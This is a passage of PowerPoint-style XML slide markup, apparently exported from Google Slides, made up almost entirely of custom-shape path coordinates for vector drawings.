                  <a:lnTo>
                    <a:pt x="17131" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17277" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17424" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17461" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17497" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17497" y="9794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17497" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17387" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17277" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17167" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16544" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16544" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16580" y="8987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16617" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16800" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17021" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17204" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17424" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17571" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17644" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17681" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17681" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17644" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17534" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17387" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17094" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16617" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16580" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16507" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16507" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16690" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16874" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17021" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17204" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17351" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17387" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17424" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17424" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17424" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17351" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17314" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17131" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16947" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16764" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16397" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16324" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16140" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16397" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16764" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16947" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17094" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17131" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17131" y="5979"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17131" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17021" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16910" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16764" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16580" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16250" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16104" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15957" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15957" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15957" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15920" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15590" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15920" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16250" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16287" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16324" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16287" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16250" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16177" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16030" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15957" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15627" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15333" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15076" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14820" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14746" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14966" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15003" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15003" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14930" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14856" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14746" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14526" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14416" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14343" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14159" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13939" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13903" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13866" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13829" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13829" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13756" y="385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7" name="Google Shape;317;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6059500" y="3516375"/>
              <a:ext cx="268700" cy="232025"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="10748" h="9281" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="4072" y="550"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4329" y="587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4585" y="697"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4842" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5025" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="1394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="1541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5282" y="1724"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5282" y="2091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4695" y="1761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="550"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1357" y="3008"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1504" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1614" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1797" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1467" y="3778"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1137" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="3118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1357" y="3008"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="3815" y="550"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4072" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4695" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4732" y="3191"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4475" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4255" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4035" y="1467"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="880"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3558" y="587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3815" y="550"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1761" y="1724"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1724" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="1944"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1834" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1944" y="2054"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2054" y="2054"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2274" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="2971"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3008" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3081" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="4255"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2164" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1944" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1724" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="2494"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1724" y="1761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="1724"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="2604" y="1174"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2715" y="1614"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2861" y="2054"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3228" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3998" y="4695"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="4365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3301" y="3888"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2861" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2274" y="1834"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2311" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2421" y="1467"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2604" y="1174"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="3338" y="660"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3375" y="770"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3668" y="1467"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="2164"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4732" y="4805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="4805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3668" y="2971"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3191" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2971" y="1504"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="807"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3338" y="660"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7703" y="4952"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7960" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7960" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7593" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7373" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7703" y="4952"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8070" y="5356"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8180" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7923" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7923" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8033" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8070" y="5356"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7556" y="5612"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7483" y="5722"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7483" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7556" y="5612"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8327" y="5649"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8327" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7850" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="5649"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8437" y="5796"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8584" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8143" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8437" y="5796"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8437" y="6346"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8180" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8437" y="6346"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8767" y="6309"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8840" y="6419"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="6309"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9024" y="4695"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9244" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="4805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9647" y="4915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9904" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10234" y="5869"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="6089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="7006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9904" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9647" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="5832"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8620" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8400" y="5025"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8143" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="4695"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1064" y="3962"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1357" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="4585"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2494" y="4695"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2641" y="4695"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3888" y="5172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3705" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3448" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3411" y="5172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3448" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="5392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4108" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4365" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4035" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="5869"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3411" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3228" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3191" y="5612"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3155" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3118" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3081" y="5502"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="5502"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3008" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2971" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2971" y="5722"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3008" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="5869"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3191" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3338" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="6199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="6309"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="6309"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3228" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2971" y="6419"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2641" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2641" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2641" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="6529"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2861" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3081" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="7226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="7336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2311" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="6896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2971" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="7703"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2971" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2641" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2311" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1981" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1871" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1834" y="7813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1797" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1797" y="7923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1834" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1944" y="8143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2091" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2164" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1944" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="8253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1247" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1027" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="697" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="550" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="550" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="550" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="5502"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="734" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1064" y="3962"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6786" y="5429"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6860" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="5832"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7006" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="5979"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7116" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7813" y="7006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8143" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8143" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8143" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8217" y="7813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8290" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8363" y="7850"/>
                  </a:lnTo>
